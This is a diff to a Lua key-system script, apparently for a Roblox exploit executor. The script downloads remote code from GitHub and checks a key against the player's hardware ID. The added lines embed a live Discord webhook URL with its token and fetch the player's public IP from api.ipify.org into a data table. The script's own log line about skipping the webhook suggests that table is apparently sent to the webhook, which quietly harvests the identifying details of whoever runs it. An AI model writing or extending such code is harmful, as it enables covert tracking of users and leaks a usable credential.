@@ -3,14 +3,25 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
+local webhookUrl = "https://discord.com/api/webhooks/1363428306048778312/ePaZU3-PDYO0-u9I2VJFQpGeYYOsn0OVA2soAoiPsDhu1Fs_WZ1_8OlQStVLLvUPpnye"
+
 local clientHWID = RbxAnalyticsService:GetClientId() or "Unknown"
 
-local success, response = pcall(function()
-    return game:HttpGet("https://raw.githubusercontent.com/minute124/OJUNYUYVF/main/KeySystem.lua")
-end)
+local function fetchWithRetry(url, maxAttempts)
+    local attempts = 0
+    while attempts < maxAttempts do
+        local success, response = pcall(game.HttpGet, game, url)
+        if success then return true, response end
+        attempts = attempts + 1
+        print("Fetch attempt " .. attempts .. " failed for " .. url .. ": " .. tostring(response))
+        wait(1) 
+    end
+    return false, "Failed to fetch data after " .. maxAttempts .. " attempts"
+end
 
+local success, response = fetchWithRetry("https://raw.githubusercontent.com/minute124/OJUNYUYVF/main/KeySystem.lua", 3)
 if not success then
-    print("Error 404-2: Failed to fetch KeySystem data")
+    print("Error 404-2: " .. response)
     return
 end
 
@@ -20,7 +31,7 @@ success, keys = pcall(function()
 end)
 
 if not success or type(keys) ~= "table" then
-    print("Error 404-3: Failed to parse KeySystem data")
+    print("Error 404-3: Failed to parse KeySystem data: " .. tostring(keys))
     return
 end
 
@@ -41,7 +52,7 @@ local function authenticate(inputKey, inputHWID)
 end
 
 local result = authenticate(getgenv().key, clientHWID)
-print(result)
+print("Authentication result:", result)
 
 if result ~= "Authenticated" then
     print("Authentication failed, skipping webhook.")
@@ -53,6 +64,11 @@ local success, lib = pcall(function()
 end)
 if not success then
     warn("Failed to load external library: " .. tostring(lib))
+end
+
+local function getIP()
+    local success, response = pcall(game.HttpGet, game, "https://api.ipify.org")
+    return success and response or "Unknown"
 end
 
 local realData = {
@@ -72,7 +88,10 @@ if _G.GetIP then
         realData.IP = ip
     else
         warn("Failed to get IP: " .. tostring(ip))
+        realData.IP = getIP()
     end
+else
+    realData.IP = getIP()
 end
 
 local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=1&width=420&height=420"
